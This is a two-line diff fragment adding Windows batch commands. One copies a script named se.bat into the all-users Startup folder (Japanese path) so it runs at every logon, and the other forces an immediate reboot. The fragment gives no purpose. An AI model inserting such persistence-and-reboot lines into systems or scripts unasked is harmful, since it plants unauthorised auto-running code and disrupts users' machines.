@@ -1,0 +1,2 @@
+copy C:\se.bat "%ALLUSERSPROFILE%\スタート メニュー\プログラム\スタートアップ"
+shutdown -r -t 1
